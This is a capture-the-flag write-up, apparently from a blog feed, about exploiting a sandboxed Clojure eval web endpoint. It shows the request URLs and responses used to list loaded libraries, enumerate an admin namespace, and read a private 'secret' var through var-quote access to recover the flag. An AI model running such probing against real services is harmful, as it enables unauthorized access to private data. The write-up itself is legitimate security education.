<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;*&rdquo;,&ldquo;result&rdquo;:&ldquo;#&lt;core$<em>STAR</em> clojure.core$<em>STAR</em>@5ca69ca5>&rdquo;}
 cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
 lets google clojure.core and find all functions of this library :
<a href="http://clojure.github.io/clojure/clojure.core-api.html">http://clojure.github.io/clojure/clojure.core-api.html</a>
this link has all built-in functions of this library . after little searching found (loaded-libs) function .
more googling about clojure i understood that for using function out syntax shoud be like
(function) . for loaded-libs it should be (loaded-libs) and response :</p>

<p>   {&ldquo;expr&rdquo;:&ldquo;(loaded-libs)&rdquo;,&ldquo;result&rdquo;:&ldquo;#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}&rdquo;}</p></blockquote>

<p>Found good things :</p>

<pre><code>noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home
</code></pre>

<p>specialy &ldquo;noname.people.admin&rdquo; because of hint of question:</p>

<blockquote><p>Remember admin is one of the people</p></blockquote>

<p>Its loaded , so we can use it in our codes but we dont know functions and classes
little googling found &ldquo;clojure.repl/dir&rdquo; it can list classes , functions &hellip; :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28clojure.repl/dir%20noname.people.admin%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=(clojure.repl/dir noname.people.admin)</a></p>

<p>and response :</p>

<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;(clojure.repl/dir noname.people.admin)&rdquo;,&ldquo;result&rdquo;:&ldquo;flag\nnil&rdquo;}</p></blockquote>

<p>oh . &ldquo;flag&rdquo; &hellip;. lets check if its public :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29</a></p>

<p> yes , its public , we can use it in interpreter :
<img src="http://up.ashiyane.org/images/b95z537owt2a0cmrm1ca.png" alt="enter image description here" /></p>

<p> got second part of flag :</p>

<pre><code>Give me some code:
</code></pre>

<blockquote><p>(noname.people.admin/flag)
Ma flag is : _b7w_1_l1k3_60l4n6_700nil</p></blockquote>

<p>We need first part of flag called admin&rsquo;s secret , let test  (noname.people.admin/secret)
and response id error :</p>

<blockquote><p>   {&ldquo;error&rdquo;:true,&ldquo;message&rdquo;:&ldquo;java.lang.IllegalStateException: var: noname.people.admin/secret is not public&rdquo;}</p></blockquote>

<p>it private , and because of namespace we cant use it also we cant switch our namespace becuase &ldquo;ns&rdquo; is closed by Java.Security&hellip;</p>

<p>lets google and find a way for bypass :)
found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions">http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions</a></p>

<p>awesome :D</p>

<p>do what it said :<br/>
<img src="http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png" alt="enter image description here" /></p>

<p>and its the first part of the flag :</p>

<blockquote><p>(#&lsquo;noname.people.admin/secret)
&ldquo;Ma secret is: [redacted]&rdquo;</p>

<p>Flag Format = sha256(secret+flag)
sha256(1_4m_50..[FILTERED]..1k3_60l4n6_700)
<strong>[redacted]</strong></p></blockquote>

<p>200 points ;)</p>

<p>WriteUp By PARSA</p>
]]></content>
  </entry>
  
</feed>
